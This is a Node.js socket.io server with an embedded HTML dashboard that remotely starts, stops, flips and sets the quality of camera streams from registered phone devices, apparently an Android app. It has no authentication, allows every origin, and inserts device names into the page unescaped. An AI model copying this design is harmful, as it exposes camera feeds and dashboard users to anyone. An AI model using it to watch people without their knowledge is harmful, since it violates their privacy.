const express = require("express");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

/* ---------------- DEVICE STORE ---------------- */
let devices = {};

/* ---------------- AUTO OFFLINE CHECK ---------------- */
setInterval(() => {
  const now = Date.now();

  Object.keys(devices).forEach(id => {
    if (now - devices[id].lastSeen > 12000) {
      devices[id].status = "offline";
      devices[id].streaming = false;
    }
  });

  io.emit("devices", devices);
}, 4000);

/* ---------------- DASHBOARD UI ---------------- */
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
<title>Live Camera Panel</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
<style>
body{
  margin:0;
  font-family:system-ui;
  background:#070b10;
  color:white;
}

.header{
  padding:15px;
  background:#0f1722;
  font-weight:700;
}

.container{
  display:flex;
  gap:10px;
  padding:10px;
  flex-wrap:wrap;
}

.box{
  background:#0f1623;
  padding:12px;
  border-radius:12px;
  border:1px solid #1f2a3a;
  flex:1;
  min-width:280px;
}

/* STREAM BOX */
.stream{
  position:relative;
  background:black;
  height:320px;
  border-radius:12px;
  overflow:hidden;
}

.stream img{
  width:100%;
  height:100%;
  object-fit:cover;
}

.live{
  position:absolute;
  top:10px;
  left:10px;
  background:red;
  padding:4px 10px;
  border-radius:20px;
  font-size:12px;
  font-weight:700;
}

/* BUTTONS */
.btns{
  display:grid;
  grid-template-columns:repeat(3,1fr);
  gap:8px;
  margin-top:10px;
}

button{
  padding:10px;
  border:none;
  border-radius:8px;
  font-weight:700;
  cursor:pointer;
}

.start{background:#1f8f4d;color:white;}
.stop{background:#b33939;color:white;}
.flip{background:#2f3640;color:white;}

.q{
  margin-top:8px;
  display:flex;
  gap:5px;
  flex-wrap:wrap;
}

.q button{
  flex:1;
  background:#1a2433;
  color:#cdd9ff;
}
.device{
  padding:8px;
  margin:5px 0;
  background:#0b111b;
  border-radius:8px;
}
.online{color:#2ecc71;}
.offline{color:#7f8c8d;}
</style>
</head>

<body>

<div class="header">📡 LIVE CAMERA CONTROL PANEL</div>

<div class="container">

  <!-- DEVICE LIST -->
  <div class="box">
    <h3>📱 Devices</h3>
    <div id="devices"></div>
  </div>

  <!-- STREAM -->
  <div class="box">
    <h3>🎥 Live Stream</h3>

    <div class="stream">
      <div class="live">LIVE</div>
      <img id="video"/>
    </div>

    <div class="btns">
      <button class="start" onclick="send('start')">▶ START</button>
      <button class="stop" onclick="send('stop')">⏹ STOP</button>
      <button class="flip" onclick="send('flip')">🔄 FLIP</button>
    </div>

    <div class="q">
      <button onclick="sendQuality('120p')">120p</button>
      <button onclick="sendQuality('240p')">240p</button>
      <button onclick="sendQuality('360p')">360p</button>
      <button onclick="sendQuality('480p')">480p</button>
    </div>

  </div>

</div>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();

/* FRAME */
socket.on("frame",(data)=>{
  document.getElementById("video").src = data;
});

/* DEVICE UPDATE */
socket.on("devices",(data)=>{
  let html = "";
  Object.keys(data).forEach(id=>{
    let d = data[id];
    html += \`
      <div class="device">
        <b>\${d.name}</b><br/>
        <span class="\${d.status}">\${d.status}</span><br/>
        streaming: \${d.streaming}
      </div>
    \`;
  });
  document.getElementById("devices").innerHTML = html;
});

/* COMMAND */
function send(cmd){
  socket.emit("command",cmd);
}

function sendQuality(q){
  socket.emit("command",{type:"quality",value:q});
}
</script>

</body>
</html>
  `);
});

/* ---------------- SOCKET LOGIC ---------------- */
io.on("connection", (socket) => {

  console.log("connected:", socket.id);

  /* DEVICE REGISTER */
  socket.on("register_device",(data)=>{
    devices[socket.id] = {
      id: socket.id,
      name: data.name || "Device",
      status: "online",
      streaming: false,
      lastSeen: Date.now()
    };

    io.emit("devices", devices);
  });

  /* HEARTBEAT */
  socket.on("heartbeat",()=>{
    if(devices[socket.id]){
      devices[socket.id].lastSeen = Date.now();
      devices[socket.id].status = "online";
    }
  });

  /* STREAM ON/OFF */
  socket.on("streaming_status",(s)=>{
    if(devices[socket.id]){
      devices[socket.id].streaming = s;
    }
    io.emit("devices",devices);
  });

  /* FRAME FROM APK */
  socket.on("frame",(data)=>{
    io.emit("frame",data);
  });

  /* COMMAND TO APK */
  socket.on("command",(cmd)=>{
    io.emit("command",cmd);
  });

  /* DISCONNECT */
  socket.on("disconnect",()=>{
    if(devices[socket.id]){
      devices[socket.id].status = "offline";
      devices[socket.id].streaming = false;
    }
    io.emit("devices",devices);
  });

});

server.listen(PORT,()=>{
  console.log("Server running on",PORT);
});
